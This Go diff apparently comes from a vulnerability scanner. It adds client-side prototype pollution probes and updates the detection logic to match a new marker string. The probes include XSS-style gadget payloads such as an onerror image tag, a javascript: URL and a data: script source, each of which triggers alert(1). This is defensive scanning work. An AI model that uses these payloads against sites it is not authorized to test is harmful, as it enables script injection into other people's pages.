@@ -24,10 +24,22 @@ func Probes() []Probe {
 	}
 }
 
+// ClientSideProbes returns query string & hash parameter payloads for DOM prototype pollution.
+func ClientSideProbes() []Probe {
+	return []Probe{
+		{Body: "__proto__[polluted]=akca_dom_polluted", Name: "client_proto_bracket", Signal: "client_proto_pollution"},
+		{Body: "__proto__.polluted=akca_dom_polluted", Name: "client_proto_dot", Signal: "client_proto_pollution"},
+		{Body: "__proto__[src]=data:,alert(1)", Name: "client_proto_script_src", Signal: "client_proto_dom_gadget"},
+		{Body: "__proto__[innerHTML]=<img/src/onerror=alert(1)>", Name: "client_proto_innerhtml", Signal: "client_proto_dom_gadget"},
+		{Body: "__proto__[url]=javascript:alert(1)", Name: "client_proto_url_sink", Signal: "client_proto_dom_gadget"},
+		{Body: "constructor[prototype][polluted]=akca_dom_polluted", Name: "client_constructor_bracket", Signal: "client_proto_pollution"},
+	}
+}
+
 // Analyze compares baseline and probe responses for prototype pollution indicators.
 func Analyze(baselineBody string, baselineStatus int, probeBody string, probeStatus int, probe Probe) (bool, string) {
 	probeLower := strings.ToLower(probeBody)
-	if strings.Contains(probeLower, "polluted") || strings.Contains(probeLower, "akca-sspp") {
+	if strings.Contains(probeLower, "akca_dom_polluted") || strings.Contains(probeLower, "polluted") || strings.Contains(probeLower, "akca-sspp") {
 		return true, probe.Signal
 	}
 	if probeStatus >= 500 && baselineStatus < 500 {
